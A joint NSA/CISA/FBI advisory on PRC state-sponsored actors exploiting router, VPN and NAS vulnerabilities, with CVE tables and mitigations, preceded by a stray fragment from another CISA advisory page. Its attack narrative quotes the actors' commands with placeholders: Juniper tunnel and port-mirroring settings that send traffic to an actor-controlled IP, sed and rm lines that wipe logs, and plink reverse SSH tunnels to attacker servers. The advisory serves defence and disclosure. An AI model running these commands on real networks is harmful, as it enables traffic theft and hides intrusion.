© 2021 The MITRE Corporation. This work is reproduced and distributed with the permission of The MITRE Corporation.
Acknowledgements
CISA and CGCYBER would like to thank VMware and Secureworks for their contributions to this CSA.

Revisions

June 23, 2022: Initial version|June 24, 2022: Added link to AA22-174A.stix.xml|July 18, 2022: MAR-10382580-2 stix






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-174a
46,"




Summary

Best Practices
• Apply patches as soon as possible
• Disable unnecessary ports and protocols
• Replace end-of-life infrastructure
• Implement a centralized patch management system
This joint Cybersecurity Advisory describes the ways in which People’s Republic of China (PRC) state-sponsored cyber actors continue to exploit publicly known vulnerabilities in order to establish a broad network of compromised infrastructure. These actors use the network to exploit a wide variety of targets worldwide, including public and private sector organizations. The advisory details the targeting and compromise of major telecommunications companies and network service providers and the top vulnerabilities—primarily Common Vulnerabilities and Exposures (CVEs)—associated with network devices routinely exploited by the cyber actors since 2020.
This joint Cybersecurity Advisory was coauthored by the National Security Agency (NSA), the Cybersecurity and Infrastructure Security Agency (CISA), and the Federal Bureau of Investigation (FBI). It builds on previous NSA, CISA, and FBI reporting to inform federal and state, local, tribal, and territorial (SLTT) government; critical infrastructure (CI), including the Defense Industrial Base (DIB); and private sector organizations about notable trends and persistent tactics, techniques, and procedures (TTPs).
Entities can mitigate the vulnerabilities listed in this advisory by applying the available patches to their systems, replacing end-of-life infrastructure, and implementing a centralized patch management program.
NSA, CISA, and the FBI urge U.S. and allied governments, CI, and private industry organizations to apply the recommendations listed in the Mitigations section and Appendix A: Vulnerabilities to increase their defensive posture and reduce the risk of PRC state-sponsored malicious cyber actors affecting their critical networks.
For more information on PRC state-sponsored malicious cyber activity, see CISA’s China Cyber Threat Overview and Advisories webpage.
Click here for PDF.
Common vulnerabilities exploited by People’s Republic of China state-sponsored cyber actors
PRC state-sponsored cyber actors readily exploit vulnerabilities to compromise unpatched network devices. Network devices, such as Small Office/Home Office (SOHO) routers and Network Attached Storage (NAS) devices, serve as additional access points to route command and control (C2) traffic and act as midpoints to conduct network intrusions on other entities. Over the last few years, a series of high-severity vulnerabilities for network devices provided cyber actors with the ability to regularly exploit and gain access to vulnerable infrastructure devices. In addition, these devices are often overlooked by cyber defenders, who struggle to maintain and keep pace with routine software patching of Internet-facing services and endpoint devices.
Since 2020, PRC state-sponsored cyber actors have conducted widespread campaigns to rapidly exploit publicly identified security vulnerabilities, also known as common vulnerabilities and exposures (CVEs). This technique has allowed the actors to gain access into victim accounts using publicly available exploit code against virtual private network (VPN) services [T1133]  or public facing applications [T1190]—without using their own distinctive or identifying malware—so long as the actors acted before victim organizations updated their systems. 
PRC state-sponsored cyber actors typically conduct their intrusions by accessing compromised servers called hop points from numerous China-based Internet Protocol (IP) addresses resolving to different Chinese Internet service providers (ISPs). The cyber actors typically obtain the use of servers by leasing remote access directly or indirectly from hosting providers. They use these servers to register and access operational email accounts, host C2 domains, and interact with victim networks. Cyber actors use these hop points as an obfuscation technique when interacting with victim networks.
These cyber actors are also consistently evolving and adapting tactics to bypass defenses. NSA, CISA, and the FBI have observed state-sponsored cyber actors monitoring network defenders’ accounts and actions, and then modifying their ongoing campaign as needed to remain undetected. Cyber actors have modified their infrastructure and toolsets immediately following the release of information related to their ongoing campaigns. PRC state-sponsored cyber actors often mix their customized toolset with publicly available tools, especially by leveraging tools that are native to the network environment, to obscure their activity by blending into the noise or normal activity of a network.
NSA, CISA, and the FBI consider the common vulnerabilities and exposures (CVEs) listed in Table 1 to be the network device CVEs most frequently exploited by PRC state-sponsored cyber actors since 2020.
 
Table 1: Top network device CVEs exploited by PRC state-sponsored cyber actors



Vendor                                       CVE                                  Vulnerability Type




Cisco
CVE-2018-0171
Remote Code Execution


CVE-2019-15271
RCE


CVE-2019-1652
RCE


Citrix
CVE-2019-19781
RCE


DrayTek
CVE-2020-8515
RCE


D-Link
CVE-2019-16920
RCE


Fortinet
CVE-2018-13382
Authentication Bypass


MikroTik
CVE-2018-14847
Authentication Bypass


Netgear
CVE-2017-6862
RCE


Pulse
CVE-2019-11510
Authentication Bypass


CVE-2021-22893
RCE


QNAP
CVE-2019-7192
Privilege Elevation


CVE-2019-7193
Remote Inject


CVE-2019-7194
XML Routing Detour Attack


CVE-2019-7195
XML Routing Detour Attack


Zyxel
CVE-2020-29583
Authentication Bypass



Telecommunications and network service provider targeting
PRC state-sponsored cyber actors frequently utilize open-source tools for reconnaissance and vulnerability scanning. The actors have utilized open-source router specific software frameworks, RouterSploit and RouterScan [T1595.002], to identify makes, models, and known vulnerabilities for further investigation and exploitation. The RouterSploit Framework is an open-source exploitation framework dedicated to embedded devices. RouterScan is an open-source tool that easily allows for the scanning of IP addresses for vulnerabilities. These tools enable exploitation of SOHO and other routers manufactured by major industry providers, including Cisco, Fortinet, and MikroTik.
Upon gaining an initial foothold into a telecommunications organization or network service provider, PRC state-sponsored cyber actors have identified critical users and infrastructure including systems critical to maintaining the security of authentication, authorization, and accounting. After identifying a critical Remote Authentication Dial-In User Service (RADIUS) server, the cyber actors gained credentials to access the underlying Structured Query Language (SQL) database [T1078] and utilized SQL commands to dump the credentials [T1555], which contained both cleartext and hashed passwords for user and administrative accounts. 
Having gained credentials from the RADIUS server, PRC state-sponsored cyber actors used those credentials with custom automated scripts to authenticate to a router via Secure Shell (SSH), execute router commands, and save the output [T1119]. These scripts targeted Cisco and Juniper routers and saved the output of the executed commands, including the current configuration of each router. After successfully capturing the command output, these configurations were exfiltrated off network to the actor’s infrastructure [TA0010]. The cyber actors likely used additional scripting to further automate the exploitation of medium to large victim networks, where routers and switches are numerous, to gather massive numbers of router configurations that would be necessary to successfully manipulate traffic within the network.
Armed with valid accounts and credentials from the compromised RADIUS server and the router configurations, the cyber actors returned to the network and used their access and knowledge to successfully authenticate and execute router commands to surreptitiously route [T1599], capture [T1020.001], and exfiltrate traffic out of the network to actor-controlled infrastructure. 
While other manufacturers likely have similar commands, the cyber actors executed the following commands on a Juniper router to perform initial tunnel configuration for eventual exfiltration out of the network:
set chassis fpc <slot number> pic <user defined value> tunnel-services bandwidth <user defined value>
set chassis network-services all-ethernet
set interfaces <interface-id> unit <unit number> tunnel source <local network IP address>
set interfaces <interface-id> unit <unit number> tunnel destination <actor controlled IP address>
 
After establishing the tunnel, the cyber actors configured the local interface on the device and updated the routing table to route traffic to actor-controlled infrastructure.
set interfaces <interface-id> unit <unit number> family inet address <local network IP address subnet>
set routing-options static route <local network IP address> next-hop <actor controlled IP address>
 
PRC state-sponsored cyber actors then configured port mirroring to copy all traffic to the local interface, which was subsequently forwarded through the tunnel out of the network to actor-controlled infrastructure. 
set firewall family inet filter <filter name> term <filter variable> then port-mirror
set forwarding-options port-mirroring input rate 1
set forwarding-options port-mirroring family inet output interface <interface-id> next-hop <local network IP address>
set forwarding-options port-mirroring family inet output no-filter-check
set interfaces <interface-id> unit <unit number> family inet filter input <filter name>
set interfaces <interface-id> unit <unit number> family inet filter output <filter name>
 
Having completed their configuration changes, the cyber actors often modified and/or removed local log files to destroy evidence of their activity to further obfuscate their presence and evade detection.
sed -i -e '/<REGEX>/d' <log filepath 1>
sed -i -e '/<REGEX>/d' <log filepath 2>
sed -i -e '/<REGEX>/d' <log filepath 3>
rm -f <log filepath 4>
rm -f <log filepath 5>
rm -f <log filepath 6>
 
PRC state-sponsored cyber actors also utilized command line utility programs like PuTTY Link (Plink) to establish SSH tunnels [T1572] between internal hosts and leased virtual private server (VPS) infrastructure. These actors often conducted system network configuration discovery [T1016.001] on these host networks by sending hypertext transfer protocol (HTTP) requests to C2 infrastructure in order to illuminate the external public IP address.
plink.exe –N –R <local port>:<host 1>:<remote port> -pw <user defined password> -batch root@<VPS1> -P <remote SSH port>
plink.exe –N –R <local port>:<host 2>:<remote port> -pw <user defined password> -batch root@<VPS2> -P <remote SSH port>
 

Mitigations

NSA, CISA, and the FBI urge organizations to apply the following recommendations as well as the mitigation and detection recommendations in Appendix A, which are tailored to observed tactics and techniques. While some vulnerabilities have specific additional mitigations below, the following mitigations generally apply:

Keep systems and products updated and patched as soon as possible after patches are released [D3-SU] . Consider leveraging a centralized patch management system to automate and expedite the process.
Immediately remove or isolate suspected compromised devices from the network [D3-ITF] [D3-OTF].
Segment networks to limit or block lateral movement [D3-NI]. 
Disable unused or unnecessary network services, ports, protocols, and devices [D3-ACH] [D3-ITF] [D3-OTF]. 
Enforce multifactor authentication (MFA) for all users, without exception [D3-MFA]. 
Enforce MFA on all VPN connections [D3-MFA]. If MFA is unavailable, enforce password complexity requirements [D3-SPP]. 
Implement strict password requirements, enforcing password complexity, changing passwords at a defined frequency, and performing regular account reviews to ensure compliance [D3-SPP].
Perform regular data backup procedures and maintain up-to-date incident response and recovery procedures. 
Disable external management capabilities and set up an out-of-band management network [D3-NI].
Isolate Internet-facing services in a network Demilitarized Zone (DMZ) to reduce the exposure of the internal network [D3-NI].
Enable robust logging of Internet-facing services and monitor the logs for signs of compromise [D3-NTA] [D3-PM].
Ensure that you have dedicated management systems [D3-PH] and accounts for system administrators. Protect these accounts with strict network policies [D3-UAP].
Enable robust logging and review of network infrastructure accesses, configuration changes, and critical infrastructure services performing authentication, authorization, and accounting functions [D3-PM]. 
Upon responding to a confirmed incident within any portion of a network, response teams should scrutinize network infrastructure accesses, evaluate potential lateral movement to network infrastructure and implement corrective actions commensurate with their findings.

Resources
Refer to us-cert.cisa.gov/china, https://www.ic3.gov/Home/IndustryAlerts, and https://www.nsa.gov/cybersecurity-guidance for previous reporting on People’s Republic of China state-sponsored malicious cyber activity.
U.S. government and critical infrastructure organizations, should consider signing up for CISA’s cyber hygiene services, including vulnerability scanning, to help reduce exposure to threats.
U.S. Defense Industrial Base (DIB) organizations, should consider signing up for the NSA Cybersecurity Collaboration Center’s DIB Cybersecurity Service Offerings, including Protective Domain Name System (PDNS) services, vulnerability scanning, and threat intelligence collaboration. For more information on eligibility criteria and how to enroll in these services, email dib_defense@cyber.nsa.gov.
Additional References

CISA (2022), Weak Security Controls and Practices Routinely Exploited for Initial Access. https://www.cisa.gov/uscert/ncas/alerts/aa22-137a
CISA (2022) 2021 Top Routinely Exploited Vulnerabilities. https://www.cisa.gov/uscert/ncas/alerts/aa22-117a
NSA (2021), Selecting and Hardening Remote Access VPN Solutions. https://media.defense.gov/2021/Sep/28/2002863184/-1/-1/0/CSI_SELECTING-HARDENING-REMOTE-ACCESS-VPNS-20210928.PDF 
NSA (2021), Chinese State-Sponsored Cyber Operations: Observed TTPs. https://media.defense.gov/2021/Jul/19/2002805003/-1/-1/0/CSA_CHINESE_STATE-SPONSORED_CYBER_TTPS.PDF 
CISA (2021), Exploitation of Pulse Connect Secure Vulnerabilities. https://www.cisa.gov/uscert/ncas/alerts/aa21-110a
NSA (2020), Chinese State-Sponsored Actors Exploit Publicly Known Vulnerabilities. https://media.defense.gov/2020/Oct/20/2002519884/-1/-1/0/CSA_CHINESE_EXPLOIT_VULNERABILITIES_UOO179811.PDF 
CISA (2020), Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity. https://www.cisa.gov/uscert/ncas/alerts/aa20-258a 
NSA (2020), Performing Out-of-Band Network Management. https://media.defense.gov/2020/Sep/17/2002499616/-1/-1/0/PERFORMING_OUT_OF_BAND_NETWORK_MANAGEMENT20200911.PDF 
CISA (2020), Critical Vulnerability in Citrix Application Delivery Controller, Gateway, and SD-WAN WANOP. https://www.cisa.gov/uscert/ncas/alerts/aa20-020a
NSA (2019), Mitigating Recent VPN Vulnerabilities. https://media.defense.gov/2019/Oct/07/2002191601/-1/-1/0/Mitigating%20Recent%20VPN%20Vulnerabilities%20-%20Copy.pdf 
NSA (2019), Update and Upgrade Software Immediately. https://media.defense.gov/2019/Sep/09/2002180319/-1/-1/0/Update%20and%20Upgrade%20Software%20Immediately.docx%20-%20Copy.pdf 

Contact Information 
To report incidents and anomalous activity or to request incident response resources or technical assistance related to these threats, contact CISA at report@cisa.gov. To report computer intrusion or cybercrime activity related to information found in this advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch at 855-292-3937 or by email at CyWatch@fbi.gov. For NSA client requirements or general cybersecurity inquiries, contact Cybersecurity_Requests@nsa.gov. 
Media Inquiries / Press Desk: 

NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov  
CISA Media Relations, 703-235-2010, CISAMedia@cisa.dhs.gov 
FBI National Press Office, 202-324-3691, npo@fbi.gov 

Disclaimer of endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Purpose
This advisory was developed by NSA, CISA, and the FBI in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders. 
Appendix A: Vulnerabilities
Table 2: Information on Cisco CVE-2018-0171



                                        Cisco CVE-2018-0171                           CVSS 3.0: 9.8 (Critical)





Vulnerability Description 
A vulnerability in the Smart Install feature of Cisco IOS Software and Cisco IOS XE Software could allow an unauthenticated, remote attacker to trigger a reload of an affected device, resulting in a denial of service (DoS) condition, or to execute arbitrary code on an affected device. The vulnerability is due to improper validation of packet data. An attacker could exploit this vulnerability by sending a crafted Smart Install message to an affected device on TCP port 4786. A successful exploit could allow the attacker to cause a buffer overflow on the affected device, which could have the following impacts: Triggering a reload of the device, Allowing the attacker to execute arbitrary code on the device, causing an indefinite loop on the affected device that triggers a watchdog crash.



Recommended Mitigations 

Cisco has released software updates that address this vulnerability.
In addition, the Cisco Smart Install feature is highly recommended to be disabled to reduce exposure.




Detection Methods

CISCO IOS Software Checker





Vulnerable Technologies and Versions
The vulnerability affects Cisco devices that are running a vulnerable release of Cisco IOS or IOS XE software and have the smart install client feature enabled. Only smart install client switches are affected by this vulnerability described in this advisory. 




References
http://www.securityfocus.com/bid/103538
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2
https://ics-cert.us-cert.gov/advisories/ICSA-18-107-04
https://ics-cert.us-cert.gov/advisories/ICSA-18-107-05
https://www.darkreading.com/perimeter/attackers-exploit-cisco-switch-issue-as-vendor-warns-of-yet-another-critical-flaw/d/d-id/1331490
http://www.securitytracker.com/id/1040580




 
Table 3: Information on Cisco CVE-2019-15271



                                              Cisco CVE-2019-15271                      CVSS 3.0: 8.8 (High)





Vulnerability Description 
A vulnerability in the web-based management interface of certain Cisco Small Business RV Series Routers could allow an authenticated, remote attacker to execute arbitrary commands with root privileges. The attacker must have either a valid credential or an active session token. The vulnerability is due to lack of input validation of the HTTP payload. An attacker could exploit this vulnerability by sending a malicious HTTP request to the web-based management interface of the targeted device. A successful exploit could allow the attacker to execute commands with root privileges.



Recommended Mitigations 

Cisco has released free software updates that address the vulnerability described in this advisory.
Cisco fixed this vulnerability in firmware releases 4.2.3.10 and later for the Cisco RV042 Dual WAN VPN Router and RV042G Dual Gigabit WAN VPN Router.
Administrators can reduce the attack surface by disabling the Remote Management feature if there is no operational requirement to use it. Note that the feature is disabled by default.




Detection Methods 

N/A





Vulnerable Technologies and Versions 
This vulnerability affects the following Cisco Small Business RV Series Routers if they are running a firmware release earlier than 4.2.3.10:

RV016 Multi-WAN VPN Router
RV042 Dual WAN VPN Router
RV042G Dual Gigabit WAN VPN Router
RV082 Dual WAN VPN Router





References 
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20191106-sbrv-cmd-x




 
Table 4: Information on Cisco CVE-2019-1652



                                                Cisco CVE-2019-1652                    CVSS 3.0: 7.2 (High)





Vulnerability Description 
A vulnerability in the web-based management interface of Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an authenticated, remote attacker with administrative privileges on an affected device to execute arbitrary commands. The vulnerability is due to improper validation of user-supplied input. An attacker could exploit this vulnerability by sending malicious HTTP POST requests to the web-based management interface of an affected device. A successful exploit could allow the attacker to execute arbitrary commands on the underlying Linux shell as root. Cisco has released firmware updates that address this vulnerability.



Recommended Mitigations 

Cisco has released free software updates that address the vulnerability described in this advisory
This vulnerability is fixed in RV320 and RV325 Dual Gigabit WAN VPN Routers Firmware Release 1.4.2.22 and later.
If the Remote Management feature is enabled, Cisco recommends disabling it to reduce exposure.




Detection Methods 

N/A





Vulnerable Technologies and Versions 
This vulnerability affects Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers running firmware releases 1.4.2.15 through 1.4.2.20.




References 
http://www.securityfocus.com/bid/106728
https://seclists.org/bugtraq/2019/Mar/55
https://www.exploit-db.com/exploits/46243/
https://www.exploit-db.com/exploits/46655/
http://seclists.org/fulldisclosure/2019/Mar/61
http://packetstormsecurity.com/files/152262/Cisco-RV320-Command-Injection.html
http://packetstormsecurity.com/files/152305/Cisco-RV320-RV325-Unauthenticated-Remote-Code-Execution.html
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject




 
Table 5: Information on Citrix CVE-2019-19781



                                                   Citrix CVE-2019-19781          CVSS 3.0: 9.8 (Critical)





Vulnerability Description 
An issue was discovered in Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0. They allow Directory Traversal.



Recommended Mitigations 

Implement the appropriate refresh according to the vulnerability details outlined by vendor: Citrix: Mitigation Steps for CVE-2019-19781. 
If possible, only allow the VPN to communicate with known Internet Protocol (IP) addresses (allow-list).




Detection Methods 

CISA has developed a free detection tool for this vulnerability: cisa.gov/check-cve-2019-19781: Test a host for susceptibility to CVE-2019-19781.
Nmap developed a script that can be used with the port scanning engine: CVE-2019-19781 – Critix ADC Path Traversal #1893.
Citrix also developed a free tool for detecting compromises of Citrix ADC Appliances related to CVE-2019-19781: Citrix / CVE-2019-19781: IOC Scanner for CVE-2019-19781.
CVE-2019-19781 is commonly exploited to install web shell malware. The National Security Agency (NSA) provides guidance on detecting and preventing web shell malware at https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF and signatures at https://github.com/nsacyber/Mitigating-Web-Shells.





Vulnerable Technologies and Versions 
The vulnerability affects the following Citrix product versions on all supported platforms:

Citrix ADC and Citrix Gateway version 13.0 all supported builds before 13.0.47.24
NetScaler ADC and NetScaler Gateway version 12.1 all supported builds before 12.1.55.18
NetScaler ADC and NetScaler Gateway version 12.0 all supported builds before 12.0.63.13
NetScaler ADC and NetScaler Gateway version 11.1 all supported builds before 11.1.63.15
NetScaler ADC and NetScaler Gateway version 10.5 all supported builds before 10.5.70.12
Citrix SD-WAN WANOP appliance models 4000-WO, 4100-WO, 5000-WO, and 5100-WO all supported software release builds before 10.2.6b and 11.0.3b 





References 
https://support.citrix.com/article/CTX267027




 
Table 6: Information on DrayTek CVE-2020-8515



                                                 DrayTek CVE-2020-8515          CVSS 3.0: 9.8 (Critical)





Vulnerability Description 
DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta, and 1.4.4_Beta devices allow remote code execution as root (without authentication) via shell metacharacters to the cgi-bin/mainfunction.cgi URI. This issue has been fixed in Vigor3900/2960/300B v1.5.1.



Recommended Mitigations 

Users of affected models should upgrade to 1.5.1 firmware or later as soon as possible, the updated firmware addresses this issue.
Disable the remote access on your router if you don’t need it.
Disable remote access (admin) and SSL VPN. The ACL does not apply to SSL VPN connections (Port 443) so you should also temporarily disable SSL VPN until you have updated the firmware.
Always back up your config before doing an upgrade.
After upgrading, check that the web interface now shows the new firmware version.
Enable syslog logging for monitoring if there are abnormal events. 




Detection Methods 

Check that no additional remote access profiles (VPN dial-in, teleworker or LAN to LAN) or admin users (for router admin) have been added.
Check if any ACL (Access Control Lists) have been altered.




Vulnerable Technologies and Versions 

This vulnerability affects the Vigor3900/2960/300B before firmware version 1.5.1.





References 
https://draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)/
http://packetstormsecurity.com/files/156979/DrayTek-Vigor2960-Vigor3900-Vigor300B-Remote-Command-Execution.html
https://sku11army.blogspot.com/2020/01/draytek-unauthenticated-rce-in-draytek.html




 
Table 7: Information on D-Link CVE-2019-16920



                                                   D-Link CVE-2019-16920          CVSS 3.0: 9.8 (Critical)





Vulnerability Description 
Unauthenticated remote code execution occurs in D-Link products such as DIR-655C, DIR-866L, DIR-652, and DHP-1565. The issue occurs when the attacker sends an arbitrary input to a ""PingTest"" device common gateway interface that could lead to common injection. An attacker who successfully triggers the command injection could achieve full system compromise. Later, it was independently found that these are also affected: DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.



Recommended Mitigations 

Recommendation is to replace affected devices with ones that are currently supported by the vendor. End-of-life devices should not be used.




Detection Methods 

HTTP packet inspection to look for arbitrary input to the “ping_test” command 




Vulnerable Technologies and Versions 

DIR DIR-655C, DIR-866L, DIR-652, DHP-1565, DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-82





References 
https://www.kb.cert.org/vuls/id/766427
https://fortiguard.com/zeroday/FG-VD-19-117
https://medium.com/@80vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3
https://www.seebug.org/vuldb/ssvid-98079




 
Table 8: Information on Fortinet CVE-2018-13382



                                                     Fortinet CVE-2018-13382            CVSS 3.0: 7.5 (High)





Vulnerability Description 
An Improper Authorization vulnerability in Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.0 to 5.6.8 and 5.4.1 to 5.4.10 and FortiProxy 2.0.0, 1.2.0 to 1.2.8, 1.1.0 to 1.1.6, 1.0.0 to 1.0.7 under SSL VPN web portal allows an unauthenticated attacker to modify the password of an SSL VPN web portal user via specially crafted HTTP requests.



Recommended Mitigations 

Upgrade to FortiOS versions 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above and/or upgrade to FortiProxy version 1.2.9 or above or version 2.0.1 or above.
SSL VPN users with local authentication can mitigate the impact by enabling Two-Factor Authentication (2FA).
Migrate SSL VPN user authentication from local to remote (LDAP or RADIUS).
Totally disable the SSL-VPN service (both web-mode and tunnel-mode) by applying the following CLI commands: config vpn ssl settings, unset source-interface, end.




Detection Methods 

HTTP packet inspection to look for specially crafted packets containing the magic key for the SSL VPN password modification





Vulnerable Technologies and Versions
This vulnerability affects the following products: 

Fortinet FortiOS 6.0.0 to 6.0.4
Fortinet FortiOS 5.6.0 to 5.6.8
Fortinet FortiOS 5.4.1 to 5.4.10
Fortinet FortiProxy 2.0.0
Fortinet FortiProxy 1.2.8 and below
Fortinet FortiProxy 1.1.6 and below
Fortinet FortiProxy 1.0.7 and below

FortiOS products are vulnerable only if the SSL VPN service (web-mode or tunnel-mode) is enabled and users with local authentication.




References 
https://fortiguard.com/psirt/FG-IR-18-389
https://fortiguard.com/advisory/FG-IR-18-389
https://www.fortiguard.com/psirt/FG-IR-20-231




 
Table 9: Information on Mikrotik CVE-2018-14847



                                            Mikrotik CVE-2018-14847            CVSS 3.0: 9.1 (Critical)





Vulnerability Description 
MikroTik RouterOS through 6.42 allows unauthenticated remote attackers to read arbitrary files and remote authenticated attackers to write arbitrary files due to a directory traversal vulnerability in the WinBox interface.



Recommended Mitigations 

Upgrade WinBox and RouterOS and change passwords
Firewall the WinBox port from the public interface and from untrusted networks




Detection Methods 

Use export command to see all your configuration and inspect for any abnormalities, such as unknown SOCKS proxy settings and scripts.





Vulnerable Technologies and Versions 
This vulnerability affected the following MikroTik products:

All bugfix releases from 6.30.1 to 6.40.7
All current releases from 6.29 to 6.42
All RC releases from 6.29rc1 to 6.43rc3





References
https://blog.mikrotik.com/security/winbox-vulnerability.html




 
Table 10: Information on Netgear CVE-2017-6862



                                             Netgear CVE-2017-6862                  CVSS 3.0: 9.8 (Critical)





Vulnerability Description 
NETGEAR WNR2000v3 devices before 1.1.2.14, WNR2000v4 devices before 1.0.0.66, and WNR2000v5 devices before 1.0.0.42 allow authentication bypass and remote code execution via a buffer overflow that uses a parameter in the administration webapp. The NETGEAR ID is PSV-2016-0261.



Recommended Mitigations 

NETGEAR has released firmware updates that fix the unauthenticated remote code execution vulnerability for all affected products. 




Detection Methods 

HTTP packet inspection to find any specially crafted packets attempting a buffer overflow through specialized parameters.





Vulnerable Technologies and Versions 
This vulnerability affects the following products:

WNR2000v3 before version 1.1.2.14
WNR2000v4 before version 1.0.0.66
WNR2000v5 before version 1.0.0.42
R2000





References 
https://kb.netgear.com/000038542/Security-Advisory-for-Unauthenticated-Remote-Code-Execution-on-Some-Routers-PSV-2016-0261
https://www.on-x.com/sites/default/files/on-x_-_security_advisory_-_netgear_wnr2000v5_-_cve-2017-6862.pdf
http://www.securityfocus.com/bid/98740




 
Table 11: Information on Pulse CVE-2019-11510



                                              Pulse CVE-2019-11510                   CVSS 3.0: 10 (Critical)





Vulnerability Description 
In Pulse Secure Pulse Connect Secure (PCS) 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4, an unauthenticated remote attacker can send a specially crafted URI to perform an arbitrary file reading vulnerability. 



Recommended Mitigations 

Upgrade to the latest Pulse Secure VPN.
Stay alert to any scheduled tasks or unknown files/executables.
Create detection/protection mechanisms that respond on directory traversal (/../../../) attempts to read local system files.





Detection Methods 

CISA developed a tool to help determine if IOCs exist in the log files of a Pulse Secure VPN Appliance for CVE-2019-11510: cisa.gov/check-your-pulse.
Nmap developed a script that can be used with the port scanning engine: http-vuln-cve2019- 11510.nse #1708.





Vulnerable Technologies and Versions 
This vulnerability affects the following Pulse Connect Secure products:

9.0R1 to 9.0R3.3
8.3R1 to 8.3R7
8.2R1 to 8.2R12





References 
https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/




 
Table 12: Information on Pulse CVE-2021-22893



                                               Pulse CVE-2021-22893              CVSS 3.0: 10 (Critical)





Vulnerability Description 
Pulse Connect Secure 9.0R3/9.1R1 and higher is vulnerable to an authentication bypass vulnerability exposed by the Windows File Share Browser and Pulse Secure Collaboration features of Pulse Connect Secure that can allow an unauthenticated user to perform remote arbitrary code execution on the Pulse Connect Secure gateway. This vulnerability has been exploited in the wild.



Recommended Mitigations

Updating such systems to PCS 9.1R11.4.
Run the PCS Integrity Assurance utility.
Enable Unauthenticated Request logging.
Enable remote logging.
Pulse Secure has published a Workaround-2104.xml file that contains mitigations to protect against this and other vulnerabilities.
Monitor capabilities in open source scanners. 




Detection Methods 

Log correlation between the authentication servers responsible for LDAP and RADIUS authentication and the VPN server. Authentication failures in either LDAP or RADIUS logs with the associated VPN logins showing success would be an anomalous event worthy of flagging.
The Pulse Security Check Tool.
A ‘recovery’ file not present in legitimate versions. https://ive-host/dana-na/auth/recover[.]cgi?token=<varies>.





Vulnerable Technologies and Versions 
This vulnerability affects Pulse Connect Secure 9.0R3/9.1R1 and higher.




References 
https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/
https://blog.pulsesecure.net/pulse-connect-secure-security-update/
https://kb.cert.org/vuls/id/213092
https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/
https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html




 
Table 13: Information on QNAP CVE-2019-7192



                                                  QNAP CVE-2019-7192               CVSS 3.0: 9.8 (Critical)





Vulnerability Description 
This improper access control vulnerability allows remote attackers to gain unauthorized access to the system. To fix these vulnerabilities, QNAP recommend updating Photo Station to their latest versions.




Recommended Mitigations 
Update Photo Station to versions: 

QTS 4.4.1 Photo Station 6.0.3 and later
QTS 4.3.4-QTS 4.4.0 Photo Station 5.7.10 and later
QTS 4.3.0-QTS 4.3.3 Photo Station 5.4.9 and later
QTS 4.2.6 Photo Station 5.2.11 and later 




Detection Methods 

N/A





Vulnerable Technologies and Versions 
This vulnerability affects QNAP Photo Station versions 5.2.11, 5.4.9, 5.7.10, and 6.0.3 or earlier.




References 
https://www.qnap.com/zh-tw/security-advisory/nas-201911-25
http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html




 
Table 14: Information on QNAP CVE- 2019-7193



                                                QNAP CVE-2019-7193                  CVSS 3.0: 9.8 (Critical)





Vulnerability Description 
This improper input validation vulnerability allows remote attackers to inject arbitrary code to the system. To fix the vulnerability, QNAP recommend updating QTS to their latest versions.




Recommended Mitigations 
Update QTS to versions: 

QTS 4.4.1 build 20190918 and later
QTS 4.3.6 build 20190919 and later




Detection Methods 

N/A





Vulnerable Technologies and Versions 
This vulnerability affects QNAP QTS 4.3.6 and 4.4.1 or earlier.




References 
https://www.qnap.com/zh-tw/security-advisory/nas-201911-25
http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html




 
Table 15: Information on QNAP CVE-2019-7194



                                               QNAP CVE-2019-7194             CVSS 3.0: 9.8 (Critical)





Vulnerability Description
This external control of file name or path vulnerability allows remote attackers to access or modify system files. To fix the vulnerability, QNAP recommend updating Photo Station to their latest versions.




Recommended Mitigations 
Update Photo Station to versions: 

QTS 4.4.1 Photo Station 6.0.3 and later
QTS 4.3.4-QTS 4.4.0 Photo Station 5.7.10 and later
QTS 4.3.0-QTS 4.3.3 Photo Station 5.4.9 and later
QTS 4.2.6 Photo Station 5.2.11 and later




Detection Methods 

N/A





Vulnerable Technologies and Versions 
This vulnerability affects QNAP Photo Station versions 5.2.11, 5.4.9, 5.7.10, and 6.0.3 or earlier.




References 
https://www.qnap.com/zh-tw/security-advisory/nas-201911-25 
